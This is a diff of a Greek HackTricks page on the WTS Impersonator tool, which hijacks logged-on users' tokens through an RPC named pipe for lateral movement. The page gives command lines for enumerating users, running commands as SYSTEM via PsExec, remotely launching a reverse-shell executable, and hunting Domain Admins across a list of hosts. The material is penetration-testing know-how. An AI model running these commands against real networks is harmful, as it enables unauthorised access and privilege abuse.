@@ -1,48 +1,54 @@
+# WTS Impersonator
+
 {{#include ../../banners/hacktricks-training.md}}
 
-Το εργαλείο **WTS Impersonator** εκμεταλλεύεται το **"\\pipe\LSM_API_service"** RPC Named pipe για να καταγράψει κρυφά τους συνδεδεμένους χρήστες και να κλέψει τα tokens τους, παρακάμπτοντας τις παραδοσιακές τεχνικές Token Impersonation. Αυτή η προσέγγιση διευκολύνει τις ομαλές πλευρικές κινήσεις εντός των δικτύων. Η καινοτομία πίσω από αυτή την τεχνική αποδίδεται στον **Omri Baso, του οποίου το έργο είναι προσβάσιμο στο [GitHub](https://github.com/OmriBaso/WTSImpersonator)**.
+Το εργαλείο **WTS Impersonator** εκμεταλλεύεται το **"\\pipe\LSM_API_service"** RPC Named pipe για να απαριθμεί stealthily τους συνδεδεμένους χρήστες και να κάνει hijack στα tokens τους, παρακάμπτοντας τις παραδοσιακές τεχνικές **Token Impersonation**. Αυτή η προσέγγιση διευκολύνει τις απρόσκοπτες πλευρικές μετακινήσεις μέσα στα δίκτυα. Η καινοτομία πίσω από αυτή την τεχνική αποδίδεται στον **Omri Baso**, του οποίου η εργασία είναι διαθέσιμη στο [GitHub](https://github.com/OmriBaso/WTSImpersonator).<sup>[[1]](#references)</sup>
 
-### Κύρια Λειτουργικότητα
+### Βασική λειτουργικότητα
 
 Το εργαλείο λειτουργεί μέσω μιας ακολουθίας κλήσεων API:
 ```bash
 WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
 ```
-### Κύρια Μodule και Χρήση
+### Βασικά Modules και Χρήση
 
-- **Καταμέτρηση Χρηστών**: Η τοπική και απομακρυσμένη καταμέτρηση χρηστών είναι δυνατή με το εργαλείο, χρησιμοποιώντας εντολές για κάθε σενάριο:
+- **Enumerating Users**: Η απαρίθμηση local και remote χρηστών είναι δυνατή με το tool, χρησιμοποιώντας commands για κάθε σενάριο:
 
-- Τοπικά:
+- Locally:
 ```bash
 .\WTSImpersonator.exe -m enum
 ```
-- Απομακρυσμένα, καθορίζοντας μια διεύθυνση IP ή όνομα υπολογιστή:
+- Remotely, με καθορισμό IP address ή hostname:
 ```bash
 .\WTSImpersonator.exe -m enum -s 192.168.40.131
 ```
 
-- **Εκτέλεση Εντολών**: Τα modules `exec` και `exec-remote` απαιτούν ένα **Service** context για να λειτουργήσουν. Η τοπική εκτέλεση χρειάζεται απλώς το εκτελέσιμο WTSImpersonator και μια εντολή:
+- **Executing Commands**: Τα modules `exec` και `exec-remote` απαιτούν context **Service** για να λειτουργήσουν. Η local εκτέλεση χρειάζεται απλώς το WTSImpersonator executable και ένα command:
 
-- Παράδειγμα για τοπική εκτέλεση εντολής:
+- Παράδειγμα local command execution:
 ```bash
 .\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
 ```
-- Το PsExec64.exe μπορεί να χρησιμοποιηθεί για να αποκτήσει ένα service context:
+- Το PsExec64.exe μπορεί να χρησιμοποιηθεί για την απόκτηση Service context:
 ```bash
 .\PsExec64.exe -accepteula -s cmd.exe
 ```
 
-- **Απομακρυσμένη Εκτέλεση Εντολών**: Περιλαμβάνει τη δημιουργία και εγκατάσταση μιας υπηρεσίας απομακρυσμένα, παρόμοια με το PsExec.exe, επιτρέποντας την εκτέλεση με κατάλληλες άδειες.
+- **Remote Command Execution**: Περιλαμβάνει τη δημιουργία και εγκατάσταση ενός service remotely, παρόμοια με το PsExec.exe, επιτρέποντας την εκτέλεση με τα κατάλληλα permissions.
 
-- Παράδειγμα απομακρυσμένης εκτέλεσης:
+- Παράδειγμα remote execution:
 ```bash
 .\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
 ```
 
-- **Module Εντοπισμού Χρηστών**: Στοχεύει συγκεκριμένους χρήστες σε πολλές μηχανές, εκτελώντας κώδικα υπό τις διαπιστεύσεις τους. Αυτό είναι ιδιαίτερα χρήσιμο για την στόχευση Domain Admins με τοπικά δικαιώματα διαχειριστή σε αρκετά συστήματα.
+- **User Hunting Module**: Στοχεύει συγκεκριμένους χρήστες σε πολλαπλά machines, εκτελώντας code με τα credentials τους. Αυτό είναι ιδιαίτερα χρήσιμο για τη στόχευση Domain Admins με local admin rights σε πολλά systems.
 - Παράδειγμα χρήσης:
 ```bash
 .\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
 ```
+
+## Αναφορές
+
+- [1] [WTSImpersonator - GitHub](https://github.com/OmriBaso/WTSImpersonator)
 
 {{#include ../../banners/hacktricks-training.md}}
